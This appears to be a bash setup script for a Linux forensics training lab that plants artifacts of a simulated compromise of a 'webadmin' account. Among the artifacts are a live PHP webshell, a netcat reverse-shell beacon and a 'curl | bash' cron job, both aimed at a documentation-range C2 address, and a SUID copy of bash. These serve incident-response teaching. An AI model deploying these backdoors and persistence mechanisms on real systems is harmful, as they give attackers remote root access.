#!/bin/bash
#
# Linux Forensics Lab - Compromise Simulation Script
# Plants forensic artifacts for IR training
#
# SCENARIO: Attacker compromised webadmin account, escalated privileges,
# deployed malware, established persistence, and attempted data exfiltration
#

set -e

echo "[*] Setting up forensics training environment..."

# =============================================================================
# TIMELINE: Simulated attack occurred on these dates
# =============================================================================
INITIAL_ACCESS="2024-01-15 02:34:17"
RECON_TIME="2024-01-15 02:35:42"
PRIVESC_TIME="2024-01-15 02:41:33"
MALWARE_DROP="2024-01-15 02:43:15"
PERSISTENCE_TIME="2024-01-15 02:45:08"
EXFIL_TIME="2024-01-15 02:52:44"
CLEANUP_TIME="2024-01-15 02:55:19"

# =============================================================================
# 1. FILESYSTEM TIMESTAMPS (MAC Times + Birth Time)
# =============================================================================
echo "[*] Planting timestamp artifacts..."

# Create files with specific timestamps that tell the attack story
mkdir -p /opt/webapp/uploads
mkdir -p /var/tmp/.cache
mkdir -p /home/webadmin/.config/procps

# Initial webshell upload
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/.shell.php
touch -d "$INITIAL_ACCESS" /var/www/html/.shell.php

# Recon scripts downloaded by attacker
cat > /tmp/linpeas.sh << 'RECON'
#!/bin/bash
# Simulated linpeas output marker
echo "=== LinPEAS Simulation ==="
id; whoami; uname -a
cat /etc/passwd
RECON
touch -d "$RECON_TIME" /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh

# Create file that was modified (mtime) but with different ctime
# This happens when attacker uses touch to hide timestamps
echo "sensitive_data=compromised" > /etc/app.conf
touch -d "2023-06-15 10:00:00" /etc/app.conf
# ctime is now (can't be faked with touch)

# =============================================================================
# 2. EXTENDED ATTRIBUTES (xattrs)
# =============================================================================
echo "[*] Planting extended attribute artifacts..."

# Some malware/tools set extended attributes
# security.capability is particularly interesting
echo "innocent looking script" > /usr/local/bin/syshealth
chmod +x /usr/local/bin/syshealth

# Set capabilities (this is a common privesc technique)
# CAP_SETUID allows the binary to setuid
if command -v setcap &> /dev/null; then
    setcap cap_setuid+ep /usr/local/bin/syshealth 2>/dev/null || true
fi

# User extended attributes (sometimes used to hide data)
echo "hidden payload data" > /opt/webapp/config.dat
setfattr -n user.payload -v "base64encodedmalware" /opt/webapp/config.dat 2>/dev/null || true
setfattr -n user.c2_server -v "198.51.100.47" /opt/webapp/config.dat 2>/dev/null || true
touch -d "$MALWARE_DROP" /opt/webapp/config.dat

# =============================================================================
# 3. INODE ARTIFACTS & HARD LINKS
# =============================================================================
echo "[*] Planting inode artifacts..."

# Create a file and hard link (same inode, investigators should notice)
echo '#!/bin/bash
# Hidden backdoor script
nc -e /bin/bash 198.51.100.47 4444 &' > /tmp/.hidden/beacon
chmod +x /tmp/.hidden/beacon
touch -d "$MALWARE_DROP" /tmp/.hidden/beacon

# Hard link in different location (same inode = same file)
ln /tmp/.hidden/beacon /var/tmp/.cache/systemd-helper 2>/dev/null || \
    cp /tmp/.hidden/beacon /var/tmp/.cache/systemd-helper

# Create file with suspicious inode gap (indicates deleted files)
# Just demonstrate the concept with marker
touch /forensics_note_inode_gaps

# =============================================================================
# 4. DELETED BUT OPEN FILES (proc/fd artifacts)
# =============================================================================
echo "[*] Setting up deleted file artifacts..."

# Create a script that will demonstrate deleted-but-open file recovery
cat > /opt/run_deleted_file_demo.sh << 'DEMO'
#!/bin/bash
# This script creates a "malware" process that deletes its own binary
# Investigators can recover it from /proc/[pid]/exe

MARKER="/tmp/.running_malware_$$"
echo "This is the deleted malware content" > "$MARKER"
echo "C2: 198.51.100.47" >> "$MARKER"
echo "Beacon interval: 300" >> "$MARKER"

# In real scenario, binary deletes itself but keeps running
# For demo, we create a process and note the technique
echo $$ > /var/run/malware_demo.pid
DEMO
chmod +x /opt/run_deleted_file_demo.sh

# =============================================================================
# 5. /proc FILESYSTEM ARTIFACTS
# =============================================================================
echo "[*] Creating proc-related artifacts..."

# Create marker files that reference proc forensics techniques
cat > /opt/proc_forensics_hints.txt << 'HINTS'
# Key /proc locations for forensics:
# /proc/[pid]/exe - Link to actual executable (survives deletion!)
# /proc/[pid]/fd/ - Open file descriptors (find deleted files)
# /proc/[pid]/maps - Memory mappings (find injected code)
# /proc/[pid]/cmdline - Original command line
# /proc/[pid]/environ - Environment variables at start
# /proc/[pid]/cwd - Current working directory
# /proc/[pid]/root - Root directory (chroot detection)
# /proc/[pid]/status - Process status, UID/GID info
# /proc/[pid]/stack - Kernel stack (requires privs)
# /proc/[pid]/loginuid - Original login UID (audit)
HINTS

# =============================================================================
# 6. BINARY LOGIN RECORDS (wtmp, btmp, lastlog)
# =============================================================================
echo "[*] Planting login artifacts..."

# These are binary files - we'll note their importance
# In real systems, use 'last', 'lastb', 'lastlog' to read them
cat > /var/log/login_forensics_note.txt << 'NOTE'
Binary login records for forensics:

/var/log/wtmp - Successful logins (read with 'last')
/var/log/btmp - Failed logins (read with 'lastb', need root)
/var/log/lastlog - Last login per user (read with 'lastlog')
/var/run/utmp - Currently logged in users (read with 'who')

Attacker may try to clean these with:
- utmpdump to edit
- Direct truncation
- Timestomping

Look for gaps in records!
NOTE

# =============================================================================
# 7. BASH HISTORY & SHELL ARTIFACTS
# =============================================================================
echo "[*] Planting shell history artifacts..."

# Attacker's bash history (partially cleaned but not perfectly)
cat > /home/webadmin/.bash_history << 'HISTORY'
ls -la
cd /var/www/html
cat config.php
mysql -u root -p
wget http://198.51.100.47/tools/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee /tmp/out.txt
sudo -l
cat /etc/sudoers
find / -perm -4000 2>/dev/null
/usr/local/bin/syshealth
wget http://198.51.100.47/beacon -O /tmp/.hidden/beacon
chmod +x /tmp/.hidden/beacon
nohup /tmp/.hidden/beacon &
crontab -e
cat /etc/shadow
history -c
HISTORY
touch -d "$CLEANUP_TIME" /home/webadmin/.bash_history

# Developer history shows normal activity then sudden attacker commands
cat > /home/developer/.bash_history << 'HISTORY'
git pull origin main
npm install
npm run build
vim src/app.js
git commit -m "Fix login bug"
cd /var/www/html
ls -la
whoami
id
python3 -c 'import pty;pty.spawn("/bin/bash")'
HISTORY

# Attacker tried to unset HISTFILE but ~/.bash_logout might log it
cat > /home/webadmin/.bash_logout << 'LOGOUT'
# ~/.bash_logout: executed by bash(1) when login shell exits.
# Attacker added: unset HISTFILE
# But the file itself is an artifact!
unset HISTFILE
LOGOUT
touch -d "$CLEANUP_TIME" /home/webadmin/.bash_logout

# =============================================================================
# 8. SCHEDULED TASKS (Cron artifacts)
# =============================================================================
echo "[*] Planting cron persistence..."

mkdir -p /var/spool/cron/crontabs

# Attacker's crontab
cat > /var/spool/cron/crontabs/webadmin << 'CRON'
# DO NOT EDIT THIS FILE - edit the master and reinstall.
# (- installed on Mon Jan 15 02:45:08 2024)
# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
# m h  dom mon dow   command
*/5 * * * * /tmp/.hidden/beacon >/dev/null 2>&1
0 */6 * * * curl -s http://198.51.100.47/update.sh | bash
CRON
chmod 600 /var/spool/cron/crontabs/webadmin
touch -d "$PERSISTENCE_TIME" /var/spool/cron/crontabs/webadmin

# System cron.d persistence
cat > /etc/cron.d/system-health << 'CRON'
# System health check - DO NOT REMOVE
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
*/10 * * * * root /usr/local/bin/syshealth >/dev/null 2>&1
CRON
touch -d "$PERSISTENCE_TIME" /etc/cron.d/system-health

# =============================================================================
# 9. SSH ARTIFACTS
# =============================================================================
echo "[*] Planting SSH artifacts..."

mkdir -p /home/webadmin/.ssh
chmod 700 /home/webadmin/.ssh

# Attacker added their key
cat > /home/webadmin/.ssh/authorized_keys << 'KEYS'
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzXXXmalicious... attacker@evil.com
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBadKeyHereXXX root@198.51.100.47
KEYS
touch -d "$PERSISTENCE_TIME" /home/webadmin/.ssh/authorized_keys

# Known hosts shows where attacker connected TO from this machine
cat > /home/webadmin/.ssh/known_hosts << 'KNOWN'
198.51.100.47 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI...
10.0.0.50 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ...
KNOWN
touch -d "$EXFIL_TIME" /home/webadmin/.ssh/known_hosts

# =============================================================================
# 10. SYSTEMD PERSISTENCE
# =============================================================================
echo "[*] Planting systemd persistence..."

mkdir -p /home/webadmin/.config/systemd/user

# User-level systemd service (sneaky persistence)
cat > /home/webadmin/.config/systemd/user/update-helper.service << 'SERVICE'
[Unit]
Description=System Update Helper
After=network.target

[Service]
Type=simple
ExecStart=/tmp/.hidden/beacon
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
SERVICE
touch -d "$PERSISTENCE_TIME" /home/webadmin/.config/systemd/user/update-helper.service

# System-level service in unusual location
cat > /etc/systemd/system/cups-helper.service << 'SERVICE'
[Unit]
Description=CUPS Print Helper Service
After=network.target
Wants=cups.service

[Service]
Type=forking
ExecStart=/bin/bash -c '/usr/local/bin/syshealth &'
Restart=on-failure

[Install]
WantedBy=multi-user.target
SERVICE
touch -d "$PERSISTENCE_TIME" /etc/systemd/system/cups-helper.service

# =============================================================================
# 11. LD_PRELOAD / Dynamic Linker Hijacking
# =============================================================================
echo "[*] Planting dynamic linker artifacts..."

# /etc/ld.so.preload is commonly used for rootkits
echo "# /lib/x86_64-linux-gnu/libsystem.so.1" > /etc/ld.so.preload
touch -d "$PERSISTENCE_TIME" /etc/ld.so.preload

# Create marker for the technique
cat > /opt/ld_preload_forensics.txt << 'NOTE'
Dynamic Linker Hijacking Artifacts:

/etc/ld.so.preload - Libraries loaded before all others (ROOTKIT!)
/etc/ld.so.conf - Library search paths
/etc/ld.so.conf.d/* - Additional library paths
LD_PRELOAD env var - Per-process hijacking

Check:
- ldd /bin/ls (see loaded libraries)
- cat /proc/[pid]/maps (memory mapped libraries)
- strings on suspicious .so files
NOTE

# =============================================================================
# 12. COMPILE THE SIMULATED MALWARE (ELF Timestamp)
# =============================================================================
echo "[*] Compiling simulated malware..."

cd /tmp
if command -v gcc &> /dev/null; then
    gcc -o /tmp/.hidden/malware_sim malware_sim.c 2>/dev/null || true
    touch -d "$MALWARE_DROP" /tmp/.hidden/malware_sim 2>/dev/null || true
fi

# =============================================================================
# 13. RECENT FILES (GUI artifact equivalent)
# =============================================================================
echo "[*] Planting recently-used artifacts..."

mkdir -p /home/webadmin/.local/share

cat > /home/webadmin/.local/share/recently-used.xbel << 'XBEL'
<?xml version="1.0" encoding="UTF-8"?>
<xbel version="1.0"
      xmlns:bookmark="http://www.freedesktop.org/standards/desktop-bookmarks"
      xmlns:mime="http://www.freedesktop.org/standards/shared-mime-info">
  <bookmark href="file:///etc/shadow" added="2024-01-15T02:41:33Z" modified="2024-01-15T02:41:33Z" visited="2024-01-15T02:41:33Z">
    <info>
      <metadata owner="http://freedesktop.org">
        <mime:mime-type type="text/plain"/>
        <bookmark:applications>
          <bookmark:application name="vim" exec="vim %u" modified="2024-01-15T02:41:33Z" count="1"/>
        </bookmark:applications>
      </metadata>
    </info>
  </bookmark>
  <bookmark href="file:///tmp/linpeas.sh" added="2024-01-15T02:35:42Z" modified="2024-01-15T02:35:42Z" visited="2024-01-15T02:35:42Z">
    <info>
      <metadata owner="http://freedesktop.org">
        <mime:mime-type type="application/x-shellscript"/>
        <bookmark:applications>
          <bookmark:application name="vim" exec="vim %u" modified="2024-01-15T02:35:42Z" count="3"/>
        </bookmark:applications>
      </metadata>
    </info>
  </bookmark>
</xbel>
XBEL
touch -d "$RECON_TIME" /home/webadmin/.local/share/recently-used.xbel

# =============================================================================
# 14. TRASH ARTIFACTS
# =============================================================================
echo "[*] Planting trash artifacts..."

mkdir -p /home/webadmin/.local/share/Trash/files
mkdir -p /home/webadmin/.local/share/Trash/info

# Attacker deleted evidence but it went to trash
echo "wget log and extracted credentials" > "/home/webadmin/.local/share/Trash/files/credentials.txt"

cat > "/home/webadmin/.local/share/Trash/info/credentials.txt.trashinfo" << 'TRASH'
[Trash Info]
Path=/home/webadmin/credentials.txt
DeletionDate=2024-01-15T02:54:33
TRASH

# =============================================================================
# 15. VIM ARTIFACTS
# =============================================================================
echo "[*] Planting vim artifacts..."

mkdir -p /home/webadmin/.vim/undodir

# Viminfo contains command history and file marks
cat > /home/webadmin/.viminfo << 'VIMINFO'
# This viminfo file was generated by Vim 8.2.
# Viminfo file is for forensics demo

# Command Line History (Oldest to Newest):
:q
:wq
:set number
:w /tmp/shadow_copy.txt
:!cat /etc/shadow
:r /etc/passwd

# Search String History (Oldest to Newest):
?password
/root
/admin

# File marks:
'0  1  0  /etc/shadow
'1  1  0  /var/www/html/.shell.php
'2  1  0  /tmp/.hidden/beacon

# Jumplist (Newest to Oldest):
-'  1  0  /etc/passwd
-'  1  0  /etc/shadow
-'  1  0  /var/www/html/config.php
VIMINFO
touch -d "$CLEANUP_TIME" /home/webadmin/.viminfo

# Swap files (vim creates these during editing)
echo "partial shadow file content during edit" > /home/webadmin/.vim/.shadow.swp
touch -d "$PRIVESC_TIME" /home/webadmin/.vim/.shadow.swp

# =============================================================================
# 16. NETWORK ARTIFACTS (DNS cache simulation)
# =============================================================================
echo "[*] Planting network artifacts..."

# /etc/hosts modifications (may fail in Docker build, that's OK)
# We'll create a marker file instead
cat > /opt/hosts_modification.txt << 'HOSTS'
# The attacker would have added these to /etc/hosts:
# 198.51.100.47  updates.microsoft.com
# 198.51.100.47  windowsupdate.com
#
# This redirects Windows Update traffic to C2 server
# Check: cat /etc/hosts for suspicious entries
HOSTS

# Try to modify hosts, ignore errors (Docker build has read-only /etc/hosts)
(cat >> /etc/hosts << 'HOSTS'

# Added for "performance"
198.51.100.47  updates.microsoft.com
198.51.100.47  windowsupdate.com
HOSTS
) 2>/dev/null || true

# =============================================================================
# 17. SUID/SGID BINARIES
# =============================================================================
echo "[*] Planting SUID artifacts..."

# Copy a binary and make it SUID (common privesc artifact)
cp /bin/bash /tmp/.hidden/rootbash 2>/dev/null || true
chmod u+s /tmp/.hidden/rootbash 2>/dev/null || true
touch -d "$PRIVESC_TIME" /tmp/.hidden/rootbash

# =============================================================================
# 18. COMPILATION ARTIFACTS
# =============================================================================
echo "[*] Planting compilation artifacts..."

mkdir -p /home/webadmin/exploits

# Source code of an exploit
cat > /home/webadmin/exploits/privesc.c << 'EXPLOIT'
/*
 * CVE-XXXX-XXXX Local Privilege Escalation
 * Downloaded from exploit-db
 */
#include <stdio.h>
#include <unistd.h>

int main() {
    // Simulated exploit code
    printf("Attempting privilege escalation...\n");
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}
EXPLOIT
touch -d "$PRIVESC_TIME" /home/webadmin/exploits/privesc.c

# =============================================================================
# 19. PACKAGE MANAGER ARTIFACTS
# =============================================================================
echo "[*] Planting package artifacts..."

mkdir -p /var/log/apt

cat > /var/log/apt/history.log << 'APT'
Start-Date: 2024-01-15  02:36:12
Commandline: apt install netcat-openbsd
Requested-By: webadmin (1000)
Install: netcat-openbsd:amd64 (1.218-4ubuntu1)
End-Date: 2024-01-15  02:36:18

Start-Date: 2024-01-15  02:36:45
Commandline: apt install gcc
Requested-By: webadmin (1000)
Install: gcc:amd64 (4:11.2.0-1ubuntu1)
End-Date: 2024-01-15  02:37:02
APT

# =============================================================================
# 20. AUDIT FRAMEWORK ARTIFACTS (loginuid)
# =============================================================================
echo "[*] Documenting audit artifacts..."

cat > /opt/audit_forensics.txt << 'AUDIT'
Linux Audit Framework Artifacts:

/proc/[pid]/loginuid - Original UID that logged in (survives sudo/su!)
  - Value of 4294967295 (-1) means "not set" (pre-login process)
  - This is IMMUTABLE once set - attacker can't change it!

/var/log/audit/audit.log - Audit daemon logs (if auditd installed)
  - SYSCALL events
  - EXECVE events (command execution)
  - FILE events

Key insight: Even if attacker does "sudo su -" or "su root",
the loginuid stays as their original UID. Great for attribution!
AUDIT

# =============================================================================
# 21. SET OWNERSHIP CORRECTLY
# =============================================================================
echo "[*] Setting ownership..."

chown -R webadmin:webadmin /home/webadmin/
chown -R developer:developer /home/developer/
chown -R www-data:www-data /var/www/html/

# =============================================================================
# CLEANUP & FINAL NOTES
# =============================================================================
echo "[*] Forensics lab setup complete!"
echo ""
echo "=== SCENARIO SUMMARY ==="
echo "Attack Timeline:"
echo "  $INITIAL_ACCESS - Initial access via webshell"
echo "  $RECON_TIME - Reconnaissance (linpeas)"
echo "  $PRIVESC_TIME - Privilege escalation"
echo "  $MALWARE_DROP - Malware deployment"
echo "  $PERSISTENCE_TIME - Persistence mechanisms"
echo "  $EXFIL_TIME - Data exfiltration"
echo "  $CLEANUP_TIME - Anti-forensics/cleanup"
echo ""
echo "Attacker C2: 198.51.100.47"
echo "Compromised account: webadmin"
echo ""
